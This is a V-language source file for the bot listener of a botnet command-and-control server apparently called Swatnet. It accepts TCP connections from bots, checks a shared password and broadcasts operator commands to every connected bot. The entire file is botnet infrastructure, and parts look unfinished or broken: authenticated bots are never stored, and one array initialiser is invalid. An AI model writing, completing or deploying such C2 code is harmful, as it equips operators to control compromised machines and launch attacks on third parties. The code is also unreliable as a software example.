module cnc

import io
import net
import time

import cnc


pub struct Bot_CNC {
	pub mut:
		nickname	[]string
		socket		[]net.TcpConn
		cpu			[]string
}

pub fn start_botcnc() Bot_CNC {
	mut b := Bot_CNC{}
	return b
}

pub fn start_bot(mut b Bot_CNC, port string, mut s cnc.Swatnet)  {
	b.listener(port, mut s)
}

pub fn (mut b Bot_CNC) listener(port string, mut s cnc.Swatnet) {
	mut socket := net.listen_tcp(.ip6, "${port}") or {
		println("[x] Error, Unable to start bot system.....!")
		return
	}

	for {
		mut bot_conn := socket.accept() or {
			println("[x] Error, Unable to accept bot connection....!")
			return
		}
		bot_conn.set_read_timeout(time.infinite)
		go b.bot_auth(mut bot_conn, mut s)
	}
}

pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, mut s cnc.Swatnet) {
	mut reader := io.new_buffered_reader(reader: bot_conn)
	hid_pw := reader.read_line() or { "" }

	if hid_pw != s.bot_pw {
		println("[x] Error, Bot access denied. Invalid password provided....!")
		bot_conn.close() or { return }
		return
	}


}

pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
	for i in 0..b.nickname.len {
		b.socket[i].write_string(cmd) or { 0 }
	}
	return 1
}

pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
	mut args := []string
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}